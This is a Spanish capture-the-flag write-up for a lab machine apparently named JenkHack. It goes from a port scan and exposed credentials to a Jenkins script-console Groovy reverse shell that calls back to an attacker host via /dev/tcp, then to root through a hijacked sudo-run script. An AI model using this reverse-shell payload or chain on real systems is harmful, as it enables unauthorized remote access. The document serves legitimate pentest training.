#MÁQUINA JENKHACK

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto.JPG)

![NMAP2](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto2.JPG)

Podemos ver que estan abiertos 3 puertos web, el 80, el 443 y el 8080, empezaremos por el puerto 80:

![WEB](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto3.JPG)

A primera vista no vemos nada extraño, sin embargo, si miramos el codigo fuente encontramos lo que pueden ser unas credenciales de un usuario admin:

![CRED](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto4.JPG)

Ademas, si miramos el contenido del puerto 8080 observamos que es el panel de login de Jenkins, asi que vamos a probar esas credenciales a ver si conseguimos entrar:

![ADMIN](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto5.JPG)

Hemos entrado genial, lo siguiente sera buscar informacion sobre como podemos ganar acceso a la maquina una vez hemos conseguido loguearnos. Tras un rato buscando encontre esta pagina que explica paso a paso que hacer:

https://exploit-notes.hdks.org/exploit/web/jenkins-pentesting/

Si seguimos los pasos que nos dice y nos ponemos a la escucha:

```shell
nc -lvnp 4444
```

```shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/172.17.0.1/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
![SCRIPT](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto6.JPG)

![IN](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto7.JPG)

Ya estamos dentro de la máquina, por lo que primero que deberemos de hacer será realizar un tratamiento de la tty:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash
```

Una vez tratada la terminal ya podemos empezar a trabajar. Despues de un rato buscando encontre algo dentro del directorio /var/www:

![NOTE](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto8.JPG)

Tenemos la contraseña del usuario jenkhack, sin embargo, esta se encuentra encriptada, para ver el texto original pegaremos la contraseña en la pagina de CyberChef:

https://gchq.github.io/CyberChef/

![CYBER](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto9.JPG)

Tenemos contraseña, vamos a probarla:

![USER](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto10.JPG)

Ahora somos el usuario jenkhack, ejecutaremos el comando sudo -l para ver si podemos ejecutar algo como root:

![SUDO](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto11.JPG)

Podemos ejecutar bash como root, probamos a hacerlo y... no funciona, pero vemos que ejecuta un comando en otra ruta:

![UY](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto12.JPG)

Iremos a esa ruta a veremos que contiene ese script:

![ALMOST](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto13.JPG)

Es un simple script en bash, por lo que podemos modificarlo para que cuando ejecutemos bash ejecute este script pero modificado por nosotros y de este modo nos convirtamos en root.

Si tratamos de modificarlo vemos que no tenemos permisos para ello, por lo que nos lo cargamos y creamos uno que tenga el mismo nombre (IMPORTANTE) y una vez hayamos escrito el script le daremos permiso de ejecucion con el comando chmod:

![CYBER](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto14.JPG)

Ejecutamos ahora bash como root y...:

![ROOT](https://github.com/Isma-yo/photos/blob/main/JenkHack/foto15.JPG)

Y ya somos root!
